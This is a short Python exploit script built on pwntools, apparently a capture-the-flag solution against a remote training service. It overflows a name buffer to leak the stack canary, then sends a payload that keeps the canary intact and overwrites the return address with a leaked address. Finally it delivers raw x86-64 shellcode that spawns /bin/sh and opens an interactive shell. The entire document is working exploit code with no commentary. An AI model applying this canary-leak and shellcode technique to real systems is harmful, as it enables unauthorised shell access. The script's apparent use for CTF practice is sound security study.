
from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', 12030)

shell = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

Gift = int(r.readline().split()[1],16)
r.recvuntil('name: ')
r.sendline(str(313))
r.recvuntil('name: ')
r.send(b'A' * 312 + b'B')

r.recvuntil(b'B')
canary = int.from_bytes(r.readline()[:-1], byteorder='little')
r.recvuntil('title: ')
r.sendline(str(550))
r.recvuntil('title: ')

p = b'B' * 312 + b'\x00' + p64(canary) + b'AAAAAAA'
p += p64(Gift)

r.sendline(p)
r.recvuntil('message: ')
r.sendline(shell)

r.interactive()